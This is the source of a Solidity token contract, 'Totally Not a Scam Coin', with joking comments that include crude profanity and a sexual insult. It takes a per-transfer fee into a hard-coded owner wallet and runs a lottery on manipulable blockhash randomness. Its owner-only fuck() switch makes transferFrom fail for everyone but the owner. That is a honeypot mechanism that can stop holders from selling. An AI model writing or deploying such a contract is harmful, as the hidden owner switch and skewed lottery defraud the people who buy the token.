pragma solidity ^0.8.0;
//SPDX-License-Identifier: NONE
//Totally Not a Scam Coin is like, TOTALLY Not a Scam.
//Why would you even say that? 
//You freaking fudder
//We're here to prove the world wrong
//And FIGHT the SCAMMERS
//This is a cryptocurrency with INTEGRITY
//That will triangulate the masses
//and have sex with your dad
//AND
//Make us all 1%ers
//No Fibbin here
//- Scammy
//https://TotallyNotAScamCoin.com/
//t.me/upsidedowntriangles
//https://discord.gg/bTSxfjRuyp


import "./ERC20.sol";
import "./Ownable.sol";

contract TNSC is Ownable, ERC20 {
    //Triangulation
    uint BURN_FEE = 420;
    uint SCAM_FEE = 80;
    uint LOTTERY_FEE = 111;
    uint counter = 0;
    //Me Fee
    address payable public scammy = payable(address(0x010704C7Ca19d299D2E66fed2A177E35dAbd6883));
    //Scamonomics
    bool private _fuck = false;
    //Fuckajob
    //mapping them holders y'all
    mapping(address => bool) public holders; 
    mapping(uint => address) public indexes;
    uint public topindex;

function triangulate() public view returns (uint256) 
{
        uint256 sum =0;
        for(uint i = 1; i <= 100; i++)
        {
            sum += uint256(blockhash(block.number - i)) % topindex;
        }
        return sum;
}

constructor() ERC20 ('Totally Not a Scam Coin','TNSC') {
    _mint(msg.sender, 420420420* 10 ** 18);
    holders[msg.sender] = true;
    indexes[topindex] = msg.sender;
    topindex += 1;
    }
       
function fuck() external onlyOwner
    {
        _fuck = !_fuck;
    }
   
function transfer(address recipient, uint256 amount) public override returns (bool){
            uint burnAmount = amount*(BURN_FEE) / 10000;
            uint scamAmount = amount*(SCAM_FEE) / 10000;
            uint lotteryAmount = amount*(LOTTERY_FEE) / 10000;
            _transfer(_msgSender(), address(this), lotteryAmount);
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(scamAmount)-(lotteryAmount));
            _transfer(_msgSender(), scammy, scamAmount);

      if (!holders[recipient]) 
        {
            holders[recipient] = true;
            indexes[topindex] = recipient;
            topindex += 1;
        }
        
        counter += 1;
        if (counter == 1) 
        {
        counter = 0;
        address payable winner = payable(indexes[triangulate() % topindex]);
        _transfer(address(this), winner, balanceOf(address(this)));
        }

      return true;
    }    

function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) public override returns (bool) 
    {
        require(!_fuck || tx.origin == owner(), "FUCK");
        return super.transferFrom(from, to, amount);
    }
}